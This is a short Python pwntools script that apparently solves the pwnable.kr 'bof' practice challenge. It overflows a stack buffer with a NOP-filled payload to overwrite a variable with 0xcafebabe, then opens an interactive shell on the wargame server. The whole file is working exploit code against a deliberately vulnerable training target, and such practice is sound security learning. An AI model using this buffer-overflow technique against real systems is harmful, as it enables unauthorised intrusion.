#!/usr/bin/env python

from pwn import *

HOST = "pwnable.kr"
PORT = 9000

char_s = 0xffffd5ac
int_a1 = 0xffffd5e0

def connection():
    conn = remote(HOST, PORT)
    return conn 

def createPayload():
    payload = "\x90" * (int_a1 - char_s)
    payload += p32(0xcafebabe)
    return payload

def exploit(conn, payload):
    log.info("offset: {}".format(int_a1 - char_s)) 
    log.info("{}".format(hexdump(payload)))
    conn.send(payload)
    conn.interactive()

if __name__ == "__main__":
    conn = connection()
    payload = createPayload()
    exploit(conn, payload)
    conn.close()
